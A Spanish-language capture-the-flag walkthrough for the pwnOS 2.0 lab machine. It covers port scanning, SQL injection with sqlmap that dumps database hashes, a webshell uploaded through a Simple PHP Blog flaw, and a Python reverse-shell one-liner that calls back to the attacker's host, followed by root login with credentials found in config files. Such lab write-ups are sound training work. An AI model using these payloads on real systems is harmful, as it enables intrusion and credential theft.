# PWNOSv2.0
Desarrollo del CTF PWNOSv2.0
> Download: https://www.vulnhub.com/entry/pwnos-20-pre-release,34/

## 1. Configuración.
- La máquina virtual viene configurada con la dirección IP 10.10.10.100.
- Debes configurar tu interfaz de red en este segmento para realizar el ejercicio.

## 2. Escano de Puertos

```
root@kali:~/PWNOS# nmap -n -P0 -p- -sC -sV -O -T5 -oA full 10.10.10.100
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-04 21:36 EST
Nmap scan report for 10.10.10.100
Host is up (0.00033s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.8p1 Debian 1ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 85:d3:2b:01:09:42:7b:20:4e:30:03:6d:d1:8f:95:ff (DSA)
|   2048 30:7a:31:9a:1b:b8:17:e7:15:df:89:92:0e:cd:58:28 (RSA)
|_  256 10:12:64:4b:7d:ff:6a:87:37:26:38:b1:44:9f:cf:5e (ECDSA)
80/tcp open  http    Apache httpd 2.2.17 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.17 (Ubuntu)
|_http-title: Welcome to this Site!
MAC Address: 00:0C:29:B5:1E:1F (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.32 - 2.6.39
Network Distance: 1 hop
```

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos1.jpg" width=80% />


## 3. Enumeración de Servicios
- Dado que tenemos un servidor web vamos a buscar carpetas "interesantes" con GOBUSTER.

```
root@kali:~/PWNOS# gobuster dir -u http://10.10.10.100:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp,aspx,jsp"
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.100:80/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php,asp,aspx,jsp,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/03/05 13:58:49 Starting gobuster
===============================================================
http://10.10.10.100:80/.htpasswd (Status: 403) [Size: 289]
http://10.10.10.100:80/.htpasswd.html (Status: 403) [Size: 294]
http://10.10.10.100:80/.htpasswd.php (Status: 403) [Size: 293]
http://10.10.10.100:80/.htpasswd.asp (Status: 403) [Size: 293]
http://10.10.10.100:80/.htpasswd.aspx (Status: 403) [Size: 294]
http://10.10.10.100:80/.htpasswd.jsp (Status: 403) [Size: 293]
http://10.10.10.100:80/.htpasswd.txt (Status: 403) [Size: 293]
http://10.10.10.100:80/.htaccess (Status: 403) [Size: 289]
http://10.10.10.100:80/.htaccess.aspx (Status: 403) [Size: 294]
http://10.10.10.100:80/.htaccess.jsp (Status: 403) [Size: 293]
http://10.10.10.100:80/.htaccess.txt (Status: 403) [Size: 293]
http://10.10.10.100:80/.htaccess.html (Status: 403) [Size: 294]
http://10.10.10.100:80/.htaccess.php (Status: 403) [Size: 293]
http://10.10.10.100:80/.htaccess.asp (Status: 403) [Size: 293]
http://10.10.10.100:80/.hta (Status: 403) [Size: 284]
http://10.10.10.100:80/.hta.jsp (Status: 403) [Size: 288]
http://10.10.10.100:80/.hta.txt (Status: 403) [Size: 288]
http://10.10.10.100:80/.hta.html (Status: 403) [Size: 289]
http://10.10.10.100:80/.hta.php (Status: 403) [Size: 288]
http://10.10.10.100:80/.hta.asp (Status: 403) [Size: 288]
http://10.10.10.100:80/.hta.aspx (Status: 403) [Size: 289]
http://10.10.10.100:80/activate (Status: 302) [Size: 0]
http://10.10.10.100:80/activate.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog (Status: 301) [Size: 311]
http://10.10.10.100:80/cgi-bin/ (Status: 403) [Size: 288]
http://10.10.10.100:80/cgi-bin/.html (Status: 403) [Size: 293]
http://10.10.10.100:80/includes (Status: 301) [Size: 315]
http://10.10.10.100:80/index (Status: 200) [Size: 854]
http://10.10.10.100:80/index.php (Status: 200) [Size: 854]
http://10.10.10.100:80/index.php (Status: 200) [Size: 854]
http://10.10.10.100:80/info.php (Status: 200) [Size: 49900]
http://10.10.10.100:80/info (Status: 200) [Size: 49888]
http://10.10.10.100:80/info.php (Status: 200) [Size: 49900]
http://10.10.10.100:80/login (Status: 200) [Size: 1174]
http://10.10.10.100:80/login.php (Status: 200) [Size: 1174]
http://10.10.10.100:80/register (Status: 200) [Size: 1562]
http://10.10.10.100:80/register.php (Status: 200) [Size: 1562]
http://10.10.10.100:80/server-status (Status: 403) [Size: 293]
===============================================================
2021/03/05 13:58:55 Finished
===============================================================
```
- Resaltan algunos archivos: info.php, server-status y la carpeta BLOG.

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos2.jpg" width=80% />

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos3.jpg" width=80% />


> Dado que encontramos la carpeta /BLOG/ vamos a seguir enumerando dentro.
```
root@kali:~/PWNOS# gobuster dir -u http://10.10.10.100:80/blog/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e -k -l -s "200,204,301,302,307,401,403" -x "txt,html,php,asp,aspx,jsp"
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.100:80/blog/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     asp,aspx,jsp,txt,html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/03/05 14:04:21 Starting gobuster
===============================================================
http://10.10.10.100:80/blog/.htaccess (Status: 403) [Size: 294]
http://10.10.10.100:80/blog/.htaccess.aspx (Status: 403) [Size: 299]
http://10.10.10.100:80/blog/.htaccess.jsp (Status: 403) [Size: 298]
http://10.10.10.100:80/blog/.htaccess.txt (Status: 403) [Size: 298]
http://10.10.10.100:80/blog/.htaccess.html (Status: 403) [Size: 299]
http://10.10.10.100:80/blog/.htaccess.php (Status: 403) [Size: 298]
http://10.10.10.100:80/blog/.htaccess.asp (Status: 403) [Size: 298]
http://10.10.10.100:80/blog/.htpasswd (Status: 403) [Size: 294]
http://10.10.10.100:80/blog/.htpasswd.aspx (Status: 403) [Size: 299]
http://10.10.10.100:80/blog/.htpasswd.jsp (Status: 403) [Size: 298]
http://10.10.10.100:80/blog/.htpasswd.txt (Status: 403) [Size: 298]
http://10.10.10.100:80/blog/.htpasswd.html (Status: 403) [Size: 299]
http://10.10.10.100:80/blog/.htpasswd.php (Status: 403) [Size: 298]
http://10.10.10.100:80/blog/.htpasswd.asp (Status: 403) [Size: 298]
http://10.10.10.100:80/blog/.hta (Status: 403) [Size: 289]
http://10.10.10.100:80/blog/.hta.txt (Status: 403) [Size: 293]
http://10.10.10.100:80/blog/.hta.html (Status: 403) [Size: 294]
http://10.10.10.100:80/blog/.hta.php (Status: 403) [Size: 293]
http://10.10.10.100:80/blog/.hta.asp (Status: 403) [Size: 293]
http://10.10.10.100:80/blog/.hta.aspx (Status: 403) [Size: 294]
http://10.10.10.100:80/blog/.hta.jsp (Status: 403) [Size: 293]
http://10.10.10.100:80/blog/add (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/add.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/atom (Status: 200) [Size: 1071]
http://10.10.10.100:80/blog/atom.php (Status: 200) [Size: 1071]
http://10.10.10.100:80/blog/categories (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/categories.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/config (Status: 301) [Size: 318]
http://10.10.10.100:80/blog/content (Status: 301) [Size: 319]
http://10.10.10.100:80/blog/comments (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/comments.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/contact (Status: 200) [Size: 6233]
http://10.10.10.100:80/blog/contact.php (Status: 200) [Size: 6233]
http://10.10.10.100:80/blog/delete (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/delete.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/docs (Status: 301) [Size: 316]
http://10.10.10.100:80/blog/flash (Status: 301) [Size: 317]
http://10.10.10.100:80/blog/images (Status: 301) [Size: 318]
http://10.10.10.100:80/blog/index.php (Status: 200) [Size: 8342]
http://10.10.10.100:80/blog/interface (Status: 301) [Size: 321]
http://10.10.10.100:80/blog/info.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/index (Status: 200) [Size: 8342]
http://10.10.10.100:80/blog/index.php (Status: 200) [Size: 8342]
http://10.10.10.100:80/blog/languages (Status: 301) [Size: 321]
http://10.10.10.100:80/blog/languages.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/info (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/info.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/logout (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/logout.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/login (Status: 200) [Size: 5982]
http://10.10.10.100:80/blog/login.php (Status: 200) [Size: 5981]
http://10.10.10.100:80/blog/options (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/options.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/rdf (Status: 200) [Size: 1432]
http://10.10.10.100:80/blog/rdf.php (Status: 200) [Size: 1432]
http://10.10.10.100:80/blog/scripts (Status: 301) [Size: 319]
http://10.10.10.100:80/blog/rss (Status: 200) [Size: 1255]
http://10.10.10.100:80/blog/rss.php (Status: 200) [Size: 1255]
http://10.10.10.100:80/blog/setup (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/setup.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/static (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/static.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/themes (Status: 301) [Size: 318]
http://10.10.10.100:80/blog/themes.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/trackback (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/trackback.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/upgrade (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/upgrade.php (Status: 302) [Size: 0]
http://10.10.10.100:80/blog/search (Status: 200) [Size: 5266]
http://10.10.10.100:80/blog/search.php (Status: 200) [Size: 5266]
http://10.10.10.100:80/blog/stats (Status: 200) [Size: 5694]
http://10.10.10.100:80/blog/stats.php (Status: 200) [Size: 5694]
```

- Tenemos más carpetas y archivos importantes.  Dado que es bastante información, voy a colocar un resumen a:


| Archivo identificado | Información obtenida |
| ------------- | ------------- |
| / | Aplicación en la carpeta raiz |
| /blog/ | Aplicación web identificada, parece un blog |
| /info.php  | PHPINFO, carpeta raiz /var/www/   |
| /blog/config/  | carpeta que contiene un archivo password.txt con hash  |
| /blog/content/  | Contenido de la aplicación  |
| /blog/images/  | imagenes de la aplicación  |


<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos4.jpg" width=80% />

- Llama la atención el password identificado en formato HASH. Vamos a identificar que algoritmo utilizaron para crearlo.

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos5.jpg" width=80% />

- Le ejecuté un HASHCAT. Sin suerte!
```
hashcat -m 500 -a 0 -o cracked.txt md5.txt /usr/share/wordlists/fasttrack.txt -O
```
<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos6.jpg" width=80% />


## 4. Explotando Vulnerabilidades

### 4.1. Inyección SQL (SQLi)

- En el portal principal tenemos una inyección simple de SQL. Está tan simple que vamos a utilizar SQLMAP para obtener todo lo más rápido posible.

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos7.jpg" width=80% />


- Capturamos el REQUEST con BURP SUITE y automatizamos el ataque.

```
POST /login.php HTTP/1.1
Host: 10.10.10.100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.100/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Connection: close
Cookie: PHPSESSID=ctmbn15i5a4r661r2h815go5q5
Upgrade-Insecure-Requests: 1

email=user&pass=pass&submit=Login&submitted=TRUE
```

```
root@kali:~/PWNOS# sqlmap -r logint.txt --random-agent --technique=BTU --current-db
```
<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos8.jpg" width=80% />

- Podemos obtener mucha información, voy a colocar lo mas importante a continuación:

```
current database: 'ch16'
current user: 'root@localhost'

database management system users [4]:
[*] 'debian-sys-maint'@'localhost'
[*] 'root'@'127.0.0.1'
[*] 'root'@'localhost'
[*] 'root'@'web'

database management system users password hashes:
[*] debian-sys-maint [1]:
    password hash: *9366FE2112E650C8E5523AE337B10A625C727943
[*] root [1]:
    password hash: *248E4800AB95A1E412A83374AD8366B0C0780FFF
    
Table: users
[1 entry]
+---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
| user_id | pass                                     | email            | active | last_name | first_name | user_level | registration_date   |
+---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+
| 1       | c2c4b4e51d9e23c02c15702c136c3e950ba9a4af | admin@isints.com | NULL   | Privett   | Dan        | 0          | 2011-05-07 17:27:01 |
+---------+------------------------------------------+------------------+--------+-----------+------------+------------+---------------------+    
```

- El hash: "c2c4b4e51d9e23c02c15702c136c3e950ba9a4af" corresponde al pass: killerbeesareflying

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos9.jpg" width=80% />

- Lo que también me llama la atención es que somos el usuario ROOT, podríamos subir una WEBSHELL a través de este usuario. Es una opción importante.

### 4.2 . Vulnerabilidad en SIMPLE PHP BLOG 0.4.0

- En los TAGS de la aplicación /blog/ podemos identificar que el portal se trata de un CMS: <meta name="generator" content="Simple PHP Blog 0.4.0" />
- Buscamos vulnerabilidades en EXPLOIT-DB para este CMS.

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos10.jpg" width=80% />

- La idea es NO USAR METASPLOIT, asi que nos toca leer el seguno enlace y DOCUMENTARNOS.
- En resumen la vulnerabilidad permite cargar un archivo PHP. Los pasos estan descritos aquí: https://www.exploit-db.com/exploits/1191 

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos11.jpg" width=80% />

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos12.jpg" width=80% />

- Después de haber reseteado el usuario y colocarle admin/admin. Entramos a la aplicación y cargarmos nuestra WEBSHELL:

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos13.jpg" width=80% />

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos14.jpg" width=80% />

> Ejecutamos la webshell y obtener conexión reversa:

```
http://10.10.10.100/blog/images/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.10.130%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos15.jpg" width=80% />


## 5. Elevando Privilegios

> Probé muchas técnicas SIN EXITO que voy a resumir aquí:
- SUDO
- NFS
- CRON
- LLAVES SSH
- Busqué credenciales en archivos de configuración y encontré algunas que me llamaron la atención.
- SUID y Versión del Kernel, encontré "/usr/lib/pt_chown" invertí bastante tiempo aquí pero sin exito.

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos16.jpg" width=80% />

- Encontré el password de ROOT de MYSQL: "goodday". 
- En la carpeta /VAR también estaba hay un archivo de configuración con la contraseña del usuario ROOT de MYSQL: root@ISIntS

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos17.jpg" width=80% />

### 5.1. Accediendo como ROOT a través de SSH

> Y como suele ocurrir en los CTF las credenciales que se obtienen tienen que ser probadas como acceso. En este caso el acceso la credenciale del usuario ROOT es: root@ISIntS

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos18.jpg" width=80% />


## 5. BONUS TRACK: Todos los caminos llevan a ROMA

- Después de resolver el CTF revisé como lo habían resuelto otras personas (puro morbo) y había otro camino interesante:  a través de una carga de archivos en MYSQL. De puro "picón" me puse a resolverlo de esa manera:


<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos19.jpg" width=80% />

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos20.jpg" width=80% />

<img src="https://github.com/El-Palomo/PWNOSv2.0/blob/main/pwnos21.jpg" width=80% />


Importante:
- Este camino resulta mas rapido.
- Si no fueramos el usuario ROOT no hubiera funcionado.
- Tuvimos suerte de encontrar una carpeta que permita escribir.






